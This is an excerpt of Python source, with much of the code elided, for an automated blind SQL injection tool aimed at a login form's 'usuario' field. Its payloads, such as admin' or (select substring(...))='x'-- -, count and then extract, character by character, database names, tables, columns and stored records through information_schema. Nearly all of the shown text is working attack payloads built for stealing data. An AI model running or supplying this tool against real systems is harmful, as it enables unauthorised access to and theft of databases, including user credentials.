...
def GetDatabaseNumber(url):
    ...
    for l in range(0, 500):
        ...
        data["usuario"] = "admin' or (select count(*) from information_schema.schemata)=%s-- -"  % (l)
...
def GetTableNumber(database, url):
    ...
    for l in range(0, 500):
        ...
        data["usuario"] = "admin' or (select count(*) from information_schema.tables where table_schema = '%s')=%s-- -" % (database, l)
...
def GetColumnNumber(database, table, url):
    ...
    for l in range(0, 500):
        ...
        data["usuario"] = "admin' or (select count(*) from information_schema.columns where table_name = '%s' and table_schema = '%s')=%s-- -" % (table, database, l)
...
def GetRegisterNumber(database, table, url):
    ...
    for l in range(0, 500):
        ...
        data["usuario"] = "admin' or (select count(*) from %s.%s)=%s-- -" % (database, table, l)
...
class SQLInjection():
    ...
    def __init__(self, url):
        self.url = url
        self.characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZÑabcdefghijklmnopqrstuvwxyzñ0123456789_,./[](){}$¡!¿?#"
            ...
            for database in range(0, number_of_databases):
                ...
                for i in range(0, 50):
                    for ch in self.characters:
                        ...
                        data["usuario"] = "admin' or (select substring(schema_name,%s,1) from information_schema.schemata limit %s,1)='%s'-- -" % (i, database, ch)
            ...
            for i in range(0, number_of_tables):
                ...
                for l in range(0, 50):
                    for ch in self.characters:
                        ...
                        data["usuario"] = "admin' or (select substring(table_name,%s,1) from information_schema.tables where table_schema = '%s' limit %s,1)='%s'-- -" % (l, database, i, ch)
            ...
            for i in range(0, number_of_columns):
                ...
                for l in range(0, 50):
                    for ch in self.characters:
                        ...
                        data["usuario"] = "admin' or (select substring(column_name,%s,1) from information_schema.columns where table_schema = '%s' and table_name = '%s' limit %s,1)='%s'-- -" % (l, database, table, i, ch)
            ...
            for i in range(0, registers):
                ...
                for l in range(0, 50):
                    for ch in self.characters:
                        ...
                        data["usuario"] = "admin' or (select substring(%s,%s,1) from %s.%s limit %s,1)='%s'-- -" % (column, l, database, table, i, ch)
